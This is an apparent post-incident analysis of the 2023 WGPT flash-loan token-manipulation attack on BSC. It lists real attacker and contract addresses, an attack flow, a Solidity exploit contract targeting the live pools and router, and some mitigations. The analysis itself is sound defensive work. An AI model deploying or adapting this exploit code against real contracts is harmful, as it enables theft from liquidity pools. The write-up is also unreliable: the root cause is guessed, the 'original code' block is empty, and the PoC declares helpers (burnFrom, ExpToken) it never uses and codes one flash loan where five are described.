# WGPT Flash Loan Token Burn Incident Analysis

## 1. Overview

| Field | Details |
|------|------|
| Project | WGPT |
| Date | 2023-07-31 |
| Chain | BSC (Binance Smart Chain) |
| Loss | ~$80,000 USD |
| Attack Type | Flash Loan + Token Supply Manipulation |
| CWE | CWE-682 (Incorrect Calculation) |
| Attacker Address | `0xdC459596aeD13B9a52FB31E20176a7D430Be8b94` |
| Attack Contract | `0x5336a15f27b74f62cc182388c005df419ffb58b8` |
| Vulnerable Contract | `0x1f415255f7E2a8546559a553E962dE7BC60d7942` (WGPT) |
| Attack TX | `0x258e53526e5a48feb1e4beadbf7ee53e07e816681ea297332533371032446bfd` |
| Fork Block | 29,891,709 |

## 2. Vulnerability Code Analysis

A token supply manipulation vulnerability in the WGPT token allowed an attacker to artificially reduce the token supply via flash loan and manipulate the pair price.

```solidity
// Vulnerable pattern: function allowing supply manipulation via external call
interface IWGPT {
    // Vulnerable: function that can burn tokens from an arbitrary address
    function burnFrom(address account, uint256 amount) external;
    // Or: supply changes are immediately reflected in price
}
```

**Vulnerability**: The WGPT token's special mechanism, combined with a flash loan, made it possible to manipulate the pair reserves.

### On-Chain Original Code

Source: Bytecode decompilation

```solidity
// Root cause: flash loan + token supply manipulation
// Source code unverified — based on bytecode analysis
```

## 3. Attack Flow

```
Attacker [0xdC459596aeD13B9a52FB31E20176a7D430Be8b94]
  │
  ├─1─▶ Chained flash loans across DPPOracle1~5
  │      [DPPOracle1: 0xFeAFe253802b77456B4627F8c2306a9CeBb5d681]
  │      [DPPOracle2: 0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A]
  │      [DPPOracle3: 0x26d0c625e5F5D6de034495fbDe1F6e9377185618]
  │      [DPP: 0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476]
  │      [DPPAdvanced: 0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d]
  │      + Uniswap V3 Pool [PoolV3]
  │      → Acquire large amount of BUSDT
  │
  ├─2─▶ Swap BUSDT → WGPT in bulk
  │      [WGPT_BUSDT Pair: 0x5a596eAE0010E16ed3B021FC09BbF0b7f1B2d3cD]
  │
  ├─3─▶ Manipulate WGPT token supply
  │      [Using ExpToken: 0xe1272a840F574b68dE861eC5009784e3411cb96c]
  │      [Pair BUSDT_ExpToken: 0xaa07222e4c3295C4E881ac8640Fbe5fB921D6840]
  │
  ├─4─▶ Reverse swap WGPT → BUSDT
  │      Receive more BUSDT at manipulated supply/price
  │
  └─5─▶ Repay all flash loans + realize ~$80K USD profit
```

## 4. PoC Core Code

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

interface IWGPT is IERC20 {
    function burnFrom(address account, uint256 amount) external;
}

contract WGPTExploit {
    IWGPT WGPT = IWGPT(0x1f415255f7E2a8546559a553E962dE7BC60d7942);
    IERC20 BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    Uni_Pair_V2 WGPT_Pair = Uni_Pair_V2(0x5a596eAE0010E16ed3B021FC09BbF0b7f1B2d3cD);
    Uni_Pair_V2 ExpPair = Uni_Pair_V2(0xaa07222e4c3295C4E881ac8640Fbe5fB921D6840);
    IERC20 ExpToken = IERC20(0xe1272a840F574b68dE861eC5009784e3411cb96c);
    IDPPOracle DPPOracle1 = IDPPOracle(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);
    Uni_Router_V2 router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    function testExploit() external {
        // Initiate chained flash loans
        DPPOracle1.flashLoan(0, BUSDT.balanceOf(address(DPPOracle1)) * 99/100, address(this), "wgpt1");
    }

    function DPPFlashLoanCall(address, uint256, uint256 quoteAmount, bytes calldata data) external {
        // Execute on the final flash loan
        address[] memory buyPath = new address[](2);
        buyPath[0] = address(BUSDT);
        buyPath[1] = address(WGPT);
        router.swapExactTokensForTokens(quoteAmount / 2, 0, buyPath, address(this), block.timestamp);

        // Supply manipulation via ExpToken pair
        uint256 wgptBalance = WGPT.balanceOf(address(this));
        WGPT.transfer(address(WGPT_Pair), wgptBalance / 2);
        WGPT_Pair.sync();

        // Reverse swap
        address[] memory sellPath = new address[](2);
        sellPath[0] = address(WGPT);
        sellPath[1] = address(BUSDT);
        WGPT.approve(address(router), type(uint256).max);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            WGPT.balanceOf(address(this)), 0, sellPath, address(this), block.timestamp
        );
    }
}
```

## 5. Vulnerability Classification

| Field | Details |
|------|------|
| CWE | CWE-682 (Incorrect Calculation) |
| Vulnerability Type | Token supply manipulation, flash loan price manipulation |
| Impact Scope | WGPT-BUSDT liquidity pool |
| Explorer | [BSCscan](https://bscscan.com/address/0x1f415255f7E2a8546559a553E962dE7BC60d7942) |

## 6. Security Recommendations

```solidity
// Mitigation 1: Add access control to burnFrom
function burnFrom(address account, uint256 amount) external {
    require(hasRole(BURNER_ROLE, msg.sender), "Not authorized to burn");
    _spendAllowance(account, msg.sender, amount);
    _burn(account, amount);
}

// Mitigation 2: Rate-limit supply changes
uint256 public constant MAX_BURN_PER_BLOCK = 1_000_000e18;
mapping(uint256 => uint256) public burnedInBlock;

function burn(uint256 amount) external {
    require(
        burnedInBlock[block.number] + amount <= MAX_BURN_PER_BLOCK,
        "Burn rate limit exceeded"
    );
    burnedInBlock[block.number] += amount;
    _burn(msg.sender, amount);
}
```

## 7. Lessons Learned

1. **Token Supply Manipulation and Price**: A design where a token's total supply is immediately reflected in price is vulnerable to manipulation whenever burn/mint functionality exists.
2. **6-Layer Flash Loan Attack**: A six-layer flash loan combining 5 DPP Oracles + a Uniswap V3 Pool can mobilize hundreds of millions of dollars in liquidity on BSC.
3. **ExpToken Helper Contract**: The pattern of using a freshly deployed ExpToken as an auxiliary instrument indicates a sophisticated, multi-component attack structure.
4. **Recurring BSC Flash Loan Pattern**: The DPP Oracle chained flash loan has been used in dozens of attacks on BSC. Protocols need monitoring that detects large fund flows within a single transaction.